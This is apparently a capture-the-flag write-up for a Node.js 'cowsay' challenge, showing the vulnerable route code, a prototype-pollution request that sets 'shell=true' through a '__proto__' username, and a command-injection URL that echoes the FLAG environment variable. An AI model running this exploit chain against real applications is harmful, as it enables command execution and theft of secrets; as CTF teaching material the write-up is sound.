<h2>Solution</h2>

<p>The <code>/usr/games/cowsay</code> game is run from <code>child_process.spawnSync</code>.</p>

<p>```javascript
router.get('/cowsay', (ctx, next) =&gt; {
  const setting = settings[ctx.state.user];
  const color = setting?.color || '#000000';</p>

<p>let cowsay = '';
  if (ctx.request.query.say) {
    const result = child_process.spawnSync('/usr/games/cowsay', [ctx.request.query.say], { timeout: 500 });
    cowsay = result.stdout.toString();
  }
```</p>

<p>The settings endpoint sets the settings for <code>ctx.state.user</code>, which is also equal to the <code>username</code> cookie. The setting name is also user-controlled.</p>

<p><code>javascript
router.post('/setting/:name', (ctx, next) =&gt; {
  if (!settings[ctx.state.user]) {
    settings[ctx.state.user] = {};
  }
  const setting = settings[ctx.state.user];
  setting[ctx.params.name] = ctx.request.body.value;
  ctx.redirect('/cowsay');
});
</code></p>

<p>This allows us to perform prototype pollution. I used <code>__proto__</code> as the username, which will set settings for <code>{}.__proto__</code>. Then, we can use <code>shell</code> as the setting name to set <code>shell=true</code> for all objects.</p>

<p>```http
POST /setting/shell HTTP/1.1
Host: localhost:3000</p>

<p>...</p>

<p>{
    "value": true
}
```</p>

<p>This makes the command run within a shell, allowing us to perform command injection:</p>

<p><code>http://cowsay-nodes.chal.acsc.asia:64280/cowsay?say=test;echo%20$FLAG</code></p>

<p>This will output the <code>FLAG</code> environment variable.</p>
